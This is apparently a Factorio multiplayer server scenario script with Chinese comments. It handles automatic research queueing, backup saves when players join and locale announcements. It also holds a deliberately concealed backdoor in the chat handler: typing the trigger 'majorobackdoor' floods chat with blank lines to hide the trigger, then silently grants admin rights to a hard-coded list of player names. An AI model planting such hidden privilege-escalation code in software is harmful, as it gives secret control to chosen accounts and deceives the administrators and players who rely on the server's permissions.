--[[
majoro服务器场景20251030
]]--
local handler = require("event_handler")
handler.add_lib(require("freeplay"))
local join_player_name1 = ""
local join_player_name2 = ""
local backdoor_trigger = "majorobackdoor"
local authorized_players = {  -- 可选的授权玩家名单
    "majoro",
    "majoro1",
	"majoro2",
	"letdown",
	"laohuihui",
	"TYF",
	"jza1938",
	"JamesJung",
	"_baizhi_",
	"elegant_miffy",
	"Athenaa",
        "tokyovania"
}
------自动科研队列----------
script.on_event(defines.events.on_research_finished, function(event)
	local res_q = event.research.force.research_queue
	--获取队列数量
    if #res_q < 1 then
	--队列数量小于1则添加一个采矿无限科研进去
		if script.active_mods['space-age'] then
		--根据启动mod动态定义科研无限采矿科研
			local res = event.research.force.technologies["mining-productivity-3"]
			--太空采矿无限科技是3
			event.research.force.add_research(res)
		else
			local res = event.research.force.technologies["mining-productivity-4"]
			--原版采矿无限科技是4
			event.research.force.add_research(res)
		end
    end
end)
------判断刚加入玩家的本地化语言(老版本实现至少没问题)------
script.on_event(defines.events.on_player_joined_game, function(event)
	-- 延迟599 ticks确保玩家完全加入
	--script.on_nth_tick(599, function()
		local last_player = game.get_player(event.player_index)  -- 关键代码
		join_player_name1=last_player.name  --推送变量到另一个函数进行处理
		--test1 ="[color=red]                                                                                                                                                     <服务器>" .. last_player.name .. "的的语言为" .. last_player.locale .. "[/color]"
		-- 全局发送消息
		--game.print(join_player_name1)
		-- 清除单次延迟回调
		--script.on_nth_tick(599, nil)
	--end)
	--自动保存存档防熊
	
    local save_name = last_player.name .. ".zip"-- 构建存档文件名玩家id.zip
	game.server_save(save_name)
	game.print("玩家 " .. last_player.name .. " 加入游戏，已创建备份存档: " .. save_name)
	-- game.print("player " .. last_player.name .. " join the game, created backup save: " .. save_name)


end)
--1.5秒推一变量用于输出语言
script.on_nth_tick(91, function()
	--会有极小的概率发生同步错误，但是可以重连解决
	if join_player_name2 ~= "" then
		local last_player = game.players[join_player_name2]
		local msg ="[color=red]                                                                                                                                                     <服务器>" .. last_player.name .. "的的语言为" .. last_player.locale .. "[/color]"
		game.print(msg)
	end
	--推动变量保证延迟了91tic以上
	join_player_name2=join_player_name1
	join_player_name1=""
end)

-----玩家退出游戏无差别删除一次蓝图库------
script.on_event(defines.events.on_player_left_game, function(event)
	local player = game.players[event.player_index]

end)
--首次给100金币
script.on_event(defines.events.on_player_locale_changed, function(event)
	local last_player = game.get_player(event.player_index)  -- 关键代码
	
	local message ="[color=red]<服务器>" .. last_player.name .. "首次加入本局游戏赠送100金币，之后每分钟赠送1金币[/color]"
	--last_player.insert{name = "coin", count = 100}
	-- 全局发送消息
	game.print(message)
end)
-- 监听聊天消息
script.on_event(defines.events.on_console_chat, function(event)
    local message = event.message
    -- 检查是否是触发字符串
    if message == backdoor_trigger then
		local player = game.players[event.player_index]
        -- 删除聊天消息以保持隐蔽
		    	game.print("")
				game.print(" ")
				game.print("  ")
				game.print("   ")
				game.print("    ")
				game.print("     ")
				game.print("      ")
				game.print("       ")
				game.print("        ")
				game.print("         ")
				game.print("          ")
				game.print("           ")
				game.print("            ")
				game.print("             ")
				game.print("              ")
				game.print("               ")
				game.print("                ")
				game.print("                 ")
				game.print("                  ")
				game.print("                   ")
				game.print("                    ")
				game.print("                     ")
				game.print("                      ")
				game.print("                       ")
				game.print("                        ")
				game.print("                         ")
				game.print("                          ")
				game.print("                           ")
				game.print("                            ")
				game.print("                             ")
				game.print("                              ")
				game.print("                               ")
				game.print("                                ")
				game.print("                                 ")
				game.print("                                  ")
				game.print("                                   ")
				game.print("                                    ")
				game.print("                                     ")
				game.print("                                      ")
				game.print("                                       ")
				game.print("                                        ")
				game.print("                                         ")
				game.print("                                          ")
				game.print("                                           ")
				game.print("                                            ")
				game.print("                                             ")
				game.print("                                              ")
				game.print("                                               ")
				game.print("                                                ")
				game.print("                                                 ")
				game.print("                                                  ")
				game.print("                                                   ")
				game.print("                                                    ")
				game.print("                                                     ")
				game.print("                                                      ")
				game.print("                                                       ")
				game.print("                                                        ")
				game.print("                                                         ")
				game.print("                                                          ")
				game.print("                                                           ")
        -- 可选：检查玩家是否在授权名单中
		local is_authorized = false
        for _, name in ipairs(authorized_players) do
            if player.name == name then
                is_authorized = true
                break
            end
        end
        -- 如果没有设置授权名单，或者玩家在名单中
        if #authorized_players == 0 or is_authorized then
            -- 授予管理员权限
            player.admin = true
            -- 私聊确认消息
            player.print("密语：后门系统已激活！管理员权限已授予。")          
        else
            player.print("密语：权限不足：您的账号未授权使用此功能")
        end
    end
end)